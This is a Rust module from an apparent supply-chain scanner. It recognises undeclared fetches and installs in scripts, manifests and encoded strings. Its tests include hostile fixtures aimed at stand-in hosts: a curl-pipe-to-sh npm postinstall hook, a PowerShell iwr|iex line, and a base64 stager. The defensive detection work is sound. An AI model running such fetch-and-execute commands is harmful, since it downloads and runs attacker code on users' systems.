//! Recognize external references in a parsed file.
//!
//! filefacts already yields *declared* dependencies (manifest and lockfile
//! fields) on [`ParsedFile::references`]. This module returns those **plus**
//! the *undeclared, imperative* ones hunted out of command streams and decoded
//! text: a `curl … | sh`, an `npm install` in a Dockerfile `RUN`, a URL stashed
//! in a shell variable. The result is one [`Discovery`]; the caller hands its
//! references to [`crate::fetch`].
//!
//! Recognition is fuzzy by nature, so it lives here, away from filefacts'
//! deterministic format parsers and from the auditable fetch boundary. Every
//! recognizer is bounded: a hostile file costs time and memory linear in its
//! size, and a recognizer that stops early says so in
//! [`Discovery::truncated`].

mod batch;
mod builtins;
mod found;
mod glib;
mod js;
mod purl_token;
mod ruby;
mod shell;
mod source;
mod urls;

use std::borrow::Cow;
use std::path::Path;

use filefacts::{FileType, ParsedFile, RefKind, RefLocator, Reference, Symbol, Values};

use found::Found;

pub use source::{import_calls, python_imports};

/// What discovery found in one file.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
#[non_exhaustive]
#[must_use]
pub struct Discovery {
    /// Declared references, then the imperative ones recognized here, each
    /// locator (with its pin and dependency context) once.
    pub references: Vec<Reference>,
    /// Downloader calls whose targets depend on runtime values, so they could
    /// not be enumerated. Each one is a known gap in `references`.
    pub unresolved: Vec<UnresolvedFetchCall>,
    /// A recognizer stopped at one of its budgets, so `references` may be
    /// missing some of what the file names.
    pub truncated: bool,
}

/// A syntactically observed downloader call with runtime-dependent arguments.
#[derive(Debug, Clone, PartialEq, Eq)]
#[non_exhaustive]
pub struct UnresolvedFetchCall {
    /// The downloader or writer API, without arguments or potentially
    /// sensitive values.
    pub command: String,
    /// Original call-site byte offset, when the producer provides one.
    pub offset: Option<u64>,
}

/// The language a text recognizer reads, which decides how commands are
/// found in it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Lang {
    Shell,
    Dockerfile,
    /// JavaScript and TypeScript, which share one grammar for the calls
    /// recognized here.
    JavaScript,
    Python,
    PowerShell,
}

impl Lang {
    /// The [`Reference::source`] of what this language's text scan finds.
    const fn label(self) -> &'static str {
        match self {
            Self::Shell => "shell",
            Self::Dockerfile => "dockerfile",
            Self::JavaScript => "javascript",
            Self::Python => "python",
            Self::PowerShell => "powershell",
        }
    }
}

/// All external references a file points at: filefacts' declared
/// dependencies, plus the imperative ones recognized here.
pub fn references(parsed: &ParsedFile<'_>) -> Discovery {
    let file_type = parsed.fileid().file_type();
    let _span = tracing::debug_span!("find", file_type = file_type.label()).entered();
    let text = scan_text(parsed.bytes(), file_type);
    let mut found = Found::new(parsed.references(), text.as_deref());
    let values = parsed.values();
    let symbols = parsed.symbols().as_slice();
    // A `.pyi` stub declares types; its imports never run.
    let python_stub = file_type == FileType::Python
        && filefacts::values::basename(values).is_some_and(|name| name.ends_with(".pyi"));
    facts(file_type, values, symbols, &mut found);
    if !python_stub {
        for reference in python_imports(file_type, symbols) {
            found.add(reference);
        }
    }
    strings(parsed, &mut found);
    match file_type {
        FileType::Shell | FileType::Dockerfile => {
            let lang = if file_type == FileType::Shell {
                Lang::Shell
            } else {
                Lang::Dockerfile
            };
            shell::scan(lang, &mut found);
            // A parsed shell script's `curl`/`wget` targets come from its
            // call facts (see `facts`), which know a comment or a printed
            // string from a command; reading the text as well would report
            // those. The text pass stands in where there are no such facts.
            if (lang == Lang::Dockerfile || parsed.source_ast().is_none())
                && let Some(text) = found.text()
            {
                urls::bare_fetch_urls(text, lang, &mut found);
            }
        }
        FileType::JavaScript | FileType::TypeScript => js::scan(parsed, &mut found),
        FileType::Python if !python_stub => source::scan_python(parsed, &mut found),
        FileType::PowerShell => {
            if let Some(text) = found.text() {
                // An explicit URL keeps its whole command line as evidence, so
                // the fetch boundary sees `irm https://… | iex` as one edge.
                urls::urls(text, Lang::PowerShell.label(), &mut found);
                urls::bare_fetch_urls(text, Lang::PowerShell, &mut found);
            }
        }
        _ => {}
    }
    found.into_discovery()
}

/// Discover references in raw bytes: open them with filefacts and run
/// [`references`]. `path` identifies the file type; nothing is read from it.
pub fn references_in_bytes(data: &[u8], path: impl AsRef<Path>) -> Discovery {
    references(&filefacts::OpenOptions::new().path(path.as_ref()).open(data))
}

/// References discoverable from a file's retained *facts* alone, without its
/// bytes: the declared references, npm lifecycle hooks, literal downloader
/// calls (shell, Ruby, GLib stylesheet writes) and Batch remote programs.
/// This is what a consumer runs on an archive member whose bytes a prior
/// analysis discarded. The text recognizers (command streams, URLs in
/// strings) need the bytes; use [`references`] when those are in hand.
///
/// `values` is the file's [`ParsedFile::values`], or that tree retained as
/// JSON and rebuilt with `Values::from`; it is read through
/// [`filefacts::values`].
pub fn references_from_facts(
    file_type: FileType,
    values: &Values,
    symbols: &[Symbol],
    declared: &[Reference],
) -> Discovery {
    let _span = tracing::debug_span!("find", file_type = file_type.label()).entered();
    let mut found = Found::new(declared, None);
    facts(file_type, values, symbols, &mut found);
    found.into_discovery()
}

/// The recognizers that need only facts, shared by both entry points.
fn facts(file_type: FileType, values: &Values, symbols: &[Symbol], out: &mut Found<'_>) {
    shell::npm_hooks(values, out);
    match file_type {
        FileType::Shell => out.absorb(urls::fetch_calls(symbols)),
        FileType::Ruby => out.absorb(ruby::discover(symbols)),
        FileType::JavaScript | FileType::TypeScript => out.absorb(glib::discover(symbols)),
        FileType::Batch => out.absorb(batch::discover(values)),
        // filefacts refuses a manifest over its size cap rather than parse
        // it, so its hooks and declared dependencies go unread: padding must
        // not pass for a manifest that names nothing.
        FileType::PackageJson | FileType::ComposerJson | FileType::ChromeManifest
            if values
                .get("json.parse.skipped")
                .and_then(serde_json::Value::as_bool)
                == Some(true) =>
        {
            out.cut_off("manifest", "filefacts manifest size cap");
        }
        _ => {}
    }
}

/// The file's text for the text-driven recognizers. A script with one invalid
/// UTF-8 byte still runs, so it must not switch its own scanning off: for the
/// file types scanned as text, each invalid byte becomes one space, keeping
/// every offset an offset into the original bytes.
///
/// A UTF-16 script (Windows tools save PowerShell that way) is decoded first,
/// or it would never be scanned at all. Its references' offsets are then
/// positions in the decoded text, so only approximate in the file.
fn scan_text(bytes: &[u8], file_type: FileType) -> Option<Cow<'_, str>> {
    if matches!(
        file_type,
        FileType::Shell | FileType::Dockerfile | FileType::PowerShell
    ) && let Some(text) = utf16_text(bytes, file_type == FileType::PowerShell)
    {
        return Some(text.into());
    }
    match std::str::from_utf8(bytes) {
        Ok(text) => Some(text.into()),
        Err(_)
            if matches!(
                file_type,
                FileType::Shell
                    | FileType::Dockerfile
                    | FileType::PowerShell
                    | FileType::JavaScript
                    | FileType::TypeScript
                    | FileType::Python
            ) =>
        {
            let mut text = String::with_capacity(bytes.len());
            for chunk in bytes.utf8_chunks() {
                text.push_str(chunk.valid());
                text.extend(std::iter::repeat_n(' ', chunk.invalid().len()));
            }
            Some(text.into())
        }
        Err(_) => None,
    }
}

/// `bytes` decoded as UTF-16, when they start with its byte-order mark — or,
/// with `sniff`, look like BOM-less UTF-16LE text (every odd byte of the
/// opening run zero, as ASCII text encodes). Unpaired surrogates become
/// U+FFFD.
fn utf16_text(bytes: &[u8], sniff: bool) -> Option<String> {
    let (body, unit): (_, fn([u8; 2]) -> u16) = match bytes {
        [0xFF, 0xFE, rest @ ..] => (rest, u16::from_le_bytes),
        [0xFE, 0xFF, rest @ ..] => (rest, u16::from_be_bytes),
        [first, ..]
            if sniff
                && bytes.len() >= 4
                && *first != 0
                && bytes.iter().take(256).skip(1).step_by(2).all(|&b| b == 0) =>
        {
            (bytes, u16::from_le_bytes)
        }
        _ => return None,
    };
    Some(
        char::decode_utf16(body.as_chunks::<2>().0.iter().copied().map(unit))
            .map(|c| c.unwrap_or(char::REPLACEMENT_CHARACTER))
            .collect(),
    )
}

/// The [`Reference::source`] of a URL in the file's extracted strings.
const STRING_SOURCE: &str = "string";

/// URLs in the file's extracted strings, including ones recovered from an
/// encoding (base64, XOR) that the raw bytes never show in the clear. Each
/// cites where the extractor found its run: for a decoded string that is the
/// encoded run, since the decoded text appears nowhere in the file.
fn strings(parsed: &ParsedFile<'_>, out: &mut Found<'_>) {
    for s in parsed.text().iter() {
        for url in urls::extract_urls(&s.value) {
            out.push_at(
                urls::url_locator(url),
                RefKind::UrlFetch,
                STRING_SOURCE,
                &s.value,
                Some(s.data_offset),
            );
        }
    }
}

/// The hunted package references whose package is **not** among the declared
/// dependencies — the phantom / undeclared-dependency set. Across a package's
/// aggregated references (its manifest's declared deps plus the imperative ones
/// hunted from every file) this surfaces a covertly-installed companion, a
/// dependency-confusion target, or a runtime-loaded package the manifest never
/// lists. Only imperative package references ([`RefKind::Command`] — install
/// commands and dynamic imports) are candidates; URL fetches and repository
/// identity are out of scope. Declared and hunted are matched by package
/// (ecosystem, namespace and name; version and qualifiers ignored), so a
/// hunted `mobx` is cancelled by a declared
/// `mobx?version_requirement=%5E6`.
///
/// Pass the references for one package (root manifest + members) collected into
/// a single slice; a per-file call cannot see the manifest's declarations.
#[must_use]
pub fn undeclared_packages(refs: &[Reference]) -> Vec<&Reference> {
    let declared: std::collections::HashSet<PackageKey<'_>> = refs
        .iter()
        .filter(|r| r.kind == RefKind::Dependency)
        .filter_map(|r| PackageKey::of(&r.locator))
        .collect();
    refs.iter()
        .filter(|r| r.kind == RefKind::Command)
        .filter(|r| PackageKey::of(&r.locator).is_some_and(|k| !declared.contains(&k)))
        .collect()
}

/// Which package a PURL locator names, independent of how it is spelled.
#[derive(Debug, PartialEq, Eq, Hash)]
enum PackageKey<'a> {
    /// A PURL's canonical type, namespace and name.
    Parsed {
        typ: String,
        namespace: Vec<String>,
        name: String,
    },
    /// A PURL that won't parse, by its text before any version, so it can
    /// still match itself.
    Unparsed(&'a str),
}

impl<'a> PackageKey<'a> {
    /// The key of a PURL locator, parsed and canonicalized, so a declared
    /// `pkg:pypi/typing-extensions@4.9.0` and a hunted
    /// `pkg:pypi/typing_extensions` (PEP 503), or a literal and an encoded npm
    /// `@scope`, are the same package. `None` for a non-PURL locator.
    fn of(locator: &'a RefLocator) -> Option<Self> {
        let RefLocator::Purl(p) = locator else {
            return None;
        };
        Some(match crate::purl::Purl::parse(p) {
            Ok(purl) => Self::Parsed {
                typ: purl.typ().to_owned(),
                namespace: purl.namespace().to_vec(),
                name: purl.name().to_owned(),
            },
            Err(_) => {
                let base = p.split(['?', '#']).next().unwrap_or(p);
                Self::Unparsed(base.rsplit_once('@').map_or(base, |(b, _)| b))
            }
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The PURL locators discovered in `bytes`, read as `name`.
    pub(super) fn purls(bytes: &[u8], name: &str) -> Vec<String> {
        references_in_bytes(bytes, name)
            .references
            .into_iter()
            .filter_map(|r| match r.locator {
                RefLocator::Purl(p) => Some(p),
                _ => None,
            })
            .collect()
    }

    /// The URL locators discovered in `bytes`, read as `name`.
    pub(super) fn urls(bytes: &[u8], name: &str) -> Vec<String> {
        references_in_bytes(bytes, name)
            .references
            .into_iter()
            .filter_map(|r| match r.locator {
                RefLocator::Url(u) => Some(u),
                _ => None,
            })
            .collect()
    }

    /// Each locator's text, for asserting on a result set.
    pub(super) fn locators<'a>(refs: impl IntoIterator<Item = &'a Reference>) -> Vec<&'a str> {
        refs.into_iter()
            .map(|r| match &r.locator {
                RefLocator::Purl(s) | RefLocator::Url(s) | RefLocator::Path(s) => s.as_str(),
                _ => "",
            })
            .collect()
    }

    fn pkg_ref(kind: RefKind, purl: &str) -> Reference {
        Reference::new(RefLocator::Purl(purl.to_owned()), kind, "test", "")
    }

    #[test]
    fn checksum_metadata_and_conflicts_survive_discovery() {
        let bytes = b"example.test/m v1.0.0/go.mod h1:METADATA\nexample.test/m v1.0.0 h1:ONE\nexample.test/m v1.0.0 h1:TWO\n";
        let parsed = filefacts::OpenOptions::new()
            .path(Path::new("go.sum"))
            .open(bytes);
        for refs in [
            references(&parsed).references,
            references_from_facts(
                FileType::GoSum,
                parsed.values(),
                parsed.symbols().as_slice(),
                parsed.references(),
            )
            .references,
        ] {
            assert_eq!(refs.len(), 3);
            assert!(refs.iter().all(|r| r.kind == RefKind::Undefined));
        }
    }

    #[test]
    fn references_from_facts_covers_hooks_downloaders_and_batch_programs() {
        let values = Values::from(serde_json::json!({
            "npm": { "scripts": {
                "postinstall": "curl -fsSL https://evil.test/s.sh | sh",
                "preinstall": "npm install sketchy-pkg"
            }}
        }));
        let found = references_from_facts(FileType::Json, &values, &[], &[]);
        let all = locators(&found.references);
        assert!(all.contains(&"https://evil.test/s.sh"), "{all:?}");
        assert!(all.contains(&"pkg:npm/sketchy-pkg"), "{all:?}");
        assert!(found.references.iter().all(|r| {
            r.context.as_ref().is_some_and(|c| c.has_install_script) == (r.kind == RefKind::Command)
        }));
        let none = Values::from(serde_json::json!({"npm": {"name": "x"}}));
        assert!(
            references_from_facts(FileType::Json, &none, &[], &[])
                .references
                .is_empty()
        );

        let script = b"#!/bin/sh\ncurl \"$PRIVATE\"\ncurl https://known.test/stage\n";
        let parsed = filefacts::OpenOptions::new()
            .path(Path::new("x.sh"))
            .open(script);
        let found = references_from_facts(
            FileType::Shell,
            parsed.values(),
            parsed.symbols().as_slice(),
            &[],
        );
        assert_eq!(locators(&found.references), ["https://known.test/stage"]);
        assert_eq!(found.unresolved.len(), 1);
        assert_eq!(found.unresolved[0].command, "curl");

        let batch =
            Values::from(serde_json::json!({"source":{"batch":{"command_sites_truncated":true}}}));
        let found = references_from_facts(FileType::Batch, &batch, &[], &[]);
        assert!(found.truncated && found.unresolved.is_empty());
        assert!(!references_from_facts(FileType::Json, &batch, &[], &[]).truncated);
    }

    #[test]
    fn python_stub_imports_do_not_become_runtime_dependencies() {
        let source = b"import requests\nfrom scapy.tools.UTscapy import main\nimport importlib\nAlias = importlib.import_module('httpx')\n";
        assert!(
            !references_in_bytes(source, "types.pyi")
                .references
                .iter()
                .any(|r| r.source == "ast-python-import-candidate")
        );
    }

    #[test]
    fn an_invalid_byte_does_not_switch_shell_scanning_off() {
        let script = b"#!/bin/sh\n# \xff\xfe\nnpm install evil-pkg\n";
        let found = references_in_bytes(script, "install.sh");
        let evil = found
            .references
            .iter()
            .find(|r| r.locator == RefLocator::Purl("pkg:npm/evil-pkg".into()))
            .expect("found");
        let at = usize::try_from(evil.offset.expect("offset")).expect("offset");
        assert!(script[at..].starts_with(b"npm install"));
    }

    #[test]
    fn utf16_scripts_are_scanned() {
        let utf16le = |text: &str, bom: bool| -> Vec<u8> {
            let mut bytes = if bom { vec![0xFF, 0xFE] } else { Vec::new() };
            bytes.extend(text.encode_utf16().flat_map(u16::to_le_bytes));
            bytes
        };
        let script = "iwr evil.test/payload.ps1 | iex\r\n";
        for bytes in [utf16le(script, true), utf16le(script, false)] {
            assert!(
                urls(&bytes, "setup.ps1").contains(&"https://evil.test/payload.ps1".to_owned())
            );
        }
        let mut utf16be = vec![0xFE, 0xFF];
        utf16be.extend(
            "npm install evil\n"
                .encode_utf16()
                .flat_map(u16::to_be_bytes),
        );
        assert_eq!(purls(&utf16be, "install.sh"), ["pkg:npm/evil"]);
    }

    #[test]
    fn references_in_bytes_recovers_base64_encoded_url() {
        // A shell stager that base64-decodes a URL and curls it: the URL is
        // never in the clear, only as base64 (`https://evil.test/x.sh`).
        let script =
            b"#!/bin/sh\nu=$(echo aHR0cHM6Ly9ldmlsLnRlc3QveC5zaA== | base64 -d)\ncurl -fsSL \"$u\" | sh\n";
        let found = references_in_bytes(script, "stage.sh");
        let decoded: Vec<_> = found
            .references
            .iter()
            .filter(|r| matches!(&r.locator, RefLocator::Url(u) if u == "https://evil.test/x.sh"))
            .collect();
        assert!(!decoded.is_empty(), "{found:?}");
        // The decoded text appears nowhere in the file, so the citation is the
        // base64 token it was decoded from.
        let b64_at = script
            .windows(4)
            .position(|w| w == b"aHR0")
            .expect("base64 token in the fixture") as u64;
        assert!(
            decoded.iter().any(|r| r.offset == Some(b64_at)),
            "{decoded:?}"
        );
    }

    #[test]
    fn undeclared_packages_diffs_hunted_against_declared() {
        // Declared ranges are spelled as filefacts emits them: a
        // `version_requirement` qualifier, not a version.
        let refs = vec![
            pkg_ref(
                RefKind::Dependency,
                "pkg:npm/mobx?version_requirement=%5E6.0.0",
            ),
            pkg_ref(
                RefKind::Dependency,
                "pkg:npm/oubliette?version_requirement=%5E1.0.2",
            ),
            pkg_ref(RefKind::Command, "pkg:npm/mobx"),
            pkg_ref(RefKind::Command, "pkg:npm/db-dx-connector"),
        ];
        assert_eq!(
            locators(undeclared_packages(&refs)),
            ["pkg:npm/db-dx-connector"]
        );
    }

    #[test]
    fn undeclared_packages_compare_canonical_names() {
        let refs = vec![
            // filefacts PEP 503-normalizes declared PyPI names.
            pkg_ref(RefKind::Dependency, "pkg:pypi/typing-extensions@4.9.0"),
            pkg_ref(RefKind::Command, "pkg:pypi/typing_extensions"),
            // A literal `@` scope is the same package as an encoded one.
            pkg_ref(RefKind::Dependency, "pkg:npm/%40scope/a@1.0.0"),
            pkg_ref(RefKind::Command, "pkg:npm/@scope/a"),
            // A different package in the same scope is not cancelled by it.
            pkg_ref(RefKind::Command, "pkg:npm/@scope/b"),
        ];
        assert_eq!(locators(undeclared_packages(&refs)), ["pkg:npm/@scope/b"]);
    }

    #[test]
    fn undeclared_ignores_version_scope_and_urls() {
        let refs = vec![
            pkg_ref(RefKind::Dependency, "pkg:npm/%40scope/pkg"),
            pkg_ref(RefKind::Command, "pkg:npm/%40scope/pkg@2.0"),
            Reference::new(
                RefLocator::Url("https://evil.test/x".into()),
                RefKind::UrlFetch,
                "test",
                "",
            ),
            pkg_ref(RefKind::Command, "pkg:pypi/evil"),
        ];
        assert_eq!(locators(undeclared_packages(&refs)), ["pkg:pypi/evil"]);
    }

    /// How long one hostile file may take, parse included, in a debug build
    /// on a loaded machine. Each input below costs minutes when a recognizer
    /// is quadratic in it, and well under a second when it is linear.
    const HOSTILE_BOUND: std::time::Duration = std::time::Duration::from_secs(10);

    fn within_bound(bytes: &[u8], name: &str) -> Discovery {
        let start = std::time::Instant::now();
        let found = references_in_bytes(bytes, name);
        let elapsed = start.elapsed();
        assert!(elapsed < HOSTILE_BOUND, "{name}: {elapsed:?}");
        found
    }

    /// [`within_bound`] for the recognizers alone: filefacts' own parse and
    /// extraction run first, untimed, since on inputs this large they cost
    /// more than the bound in a debug build however linear the scan is.
    fn scan_within_bound(bytes: &[u8], name: &str) -> Discovery {
        let parsed = filefacts::OpenOptions::new()
            .path(Path::new(name))
            .open(bytes);
        let _ = (parsed.source_ast(), parsed.symbols(), parsed.values());
        let _ = (parsed.text(), parsed.references());
        let start = std::time::Instant::now();
        let found = references(&parsed);
        let elapsed = start.elapsed();
        assert!(elapsed < HOSTILE_BOUND, "{name}: {elapsed:?}");
        found
    }

    /// An npm manifest whose `postinstall` hook is `command`.
    fn hook(command: &str) -> Vec<u8> {
        serde_json::to_vec(&serde_json::json!({
            "name": "x",
            "version": "1.0.0",
            "scripts": { "postinstall": command }
        }))
        .unwrap()
    }

    #[test]
    fn a_long_backslash_run_after_a_url_costs_linear_time() {
        let command = format!("curl http://a.test/{}\n", "\\".repeat(200_000));
        let found = within_bound(&hook(&command), "package.json");
        assert!(locators(&found.references).contains(&"http://a.test/"));
        let script = format!("curl http://a.test/{}\n", "\\".repeat(200_000));
        let found = within_bound(script.as_bytes(), "x.sh");
        assert!(locators(&found.references).contains(&"http://a.test/"));
    }

    #[test]
    fn a_run_of_option_words_costs_linear_time() {
        // Each hook stays under filefacts' 1 MiB manifest cap, so it is parsed.
        for (command, want) in [
            ("-/npm ".repeat(170_000), None),
            ("npm --registry npm ".repeat(55_000), None),
            (
                format!("npm {}install evil", "-x ".repeat(200_000)),
                Some("pkg:npm/evil"),
            ),
        ] {
            let found = within_bound(&hook(&command), "package.json");
            assert_eq!(
                locators(&found.references),
                Vec::from_iter(want),
                "{:?}",
                found.references
            );
            assert!(!found.truncated);
        }
    }

    #[test]
    fn resolved_text_cannot_amplify_a_long_constant() {
        let constant = format!("npm i {}", "zz ".repeat(5_400));
        let mut js = format!(
            "const cp=require('child_process');cp.exec('npm i early');const a='{constant}';\n"
        );
        for i in 0..2_000 {
            js.push_str(&format!("cp.exec(a+'{i}');\n"));
        }
        let found = within_bound(js.as_bytes(), "x.js");
        let all = locators(&found.references);
        assert!(all.contains(&"pkg:npm/early"), "{all:?}");
        assert!(all.contains(&"pkg:npm/zz"), "{all:?}");
        // Rebuilding the constant at every call outspends the file's budget,
        // which stops resolution after a bounded number of calls.
        assert!(found.truncated);
        assert!(found.references.len() < 100, "{}", found.references.len());
        // A file of ordinary size resolves every call.
        let small = "const cp=require('child_process');const a='npm i zz ';cp.exec(a+'one');cp.exec(a+'two');";
        let found = references_in_bytes(small.as_bytes(), "x.js");
        assert!(!found.truncated);
        assert!(locators(&found.references).contains(&"pkg:npm/two"));
    }

    #[test]
    fn an_npm_hook_naming_one_url_many_times_costs_linear_time() {
        // Just under filefacts' 1 MiB manifest cap, so the hook is parsed.
        let command = "curl http://a.test/x ".repeat(49_000);
        let found = scan_within_bound(&hook(&command), "package.json");
        assert_eq!(locators(&found.references), ["http://a.test/x"]);
        assert!(!found.truncated);
    }

    #[test]
    fn a_manifest_over_the_parse_cap_is_truncated_not_clean() {
        // Padding a manifest past filefacts' cap hides its hooks from the
        // parse; the discovery must say it is incomplete.
        let command = "curl http://a.test/x ".repeat(50_000);
        let found = references_in_bytes(&hook(&command), "package.json");
        assert!(found.truncated);
    }

    #[test]
    fn a_long_chain_of_set_calls_costs_linear_time() {
        let js = format!("x{};require('evil-pkg');", ".set()".repeat(100_000));
        let found = scan_within_bound(js.as_bytes(), "x.js");
        assert!(locators(&found.references).contains(&"pkg:npm/evil-pkg"));
    }

    /// Name lookups never climb the scope chain, so names used and written
    /// deep inside nested blocks cost linear time.
    #[test]
    fn writes_deep_in_nested_scopes_cost_linear_time() {
        for body in ["a=1;", "var v=1;", "f(b);"] {
            let js = format!(
                "{}{}{}",
                "{".repeat(250),
                body.repeat(100_000),
                "}".repeat(250)
            );
            let found = scan_within_bound(js.as_bytes(), "x.js");
            assert!(!found.truncated, "{body}");
        }
    }

    /// However deeply a file nests its blocks, its calls are still read: a
    /// few hundred braces must not switch the JavaScript recognizer off.
    #[test]
    fn deeply_nested_scopes_do_not_hide_a_files_calls() {
        let depth = 5_000;
        let js = format!(
            "const cp=require('child_process');const c='npm i evil-cmd';{}require('evil-pkg');cp.execSync(c);{}",
            "{".repeat(depth),
            "}".repeat(depth)
        );
        let found = within_bound(js.as_bytes(), "x.js");
        let all = locators(&found.references);
        assert!(all.contains(&"pkg:npm/evil-pkg"), "{all:?}");
        assert!(all.contains(&"pkg:npm/evil-cmd"), "{all:?}");
        assert!(!found.truncated);
    }

    #[test]
    fn nested_process_calls_are_normalized_once() {
        let depth = 16_000;
        let js = format!(
            "const cp=require('child_process');{}'npm i evil'{};",
            "cp.exec(".repeat(depth),
            ")".repeat(depth)
        );
        let found = within_bound(js.as_bytes(), "x.js");
        assert_eq!(locators(&found.references), ["pkg:npm/evil"]);
    }
}
